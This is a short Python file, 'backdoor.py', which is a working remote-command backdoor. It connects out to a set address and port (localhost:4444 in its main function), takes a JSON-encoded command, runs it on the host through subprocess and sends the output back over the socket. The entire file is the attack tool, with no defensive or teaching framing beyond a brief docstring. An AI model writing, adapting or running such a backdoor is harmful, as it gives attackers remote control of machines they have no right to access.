"""
backdoor.py

Author: Sam Hilliard

When executed, opens a connection to a specified
address and port. Once connected, used to execute
commands on the host machine.
"""

import socket
import subprocess
import json

class Backdoor:

    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def recieve_data(self):
        data = ''

        while True:
            data += self.connection.recv(1024).decode('utf-8')
            try:
                return json.loads(data)
            except json.decoder.JSONDecodeError:
                continue


    def send_data(self, data):
        packaged = json.dumps(data.decode('utf-8'))
        return self.connection.send(packaged.encode('utf-8'))

    def run_system_command(self, command):
        # FIXME: only executing first index in list...
        return subprocess.check_output(command)



def main():
    backdoor = Backdoor('127.0.0.1', 4444)

    command = backdoor.recieve_data()
    result = backdoor.run_system_command(command)
    backdoor.send_data(result)

    backdoor.connection.close()

if __name__ == '__main__':
    main()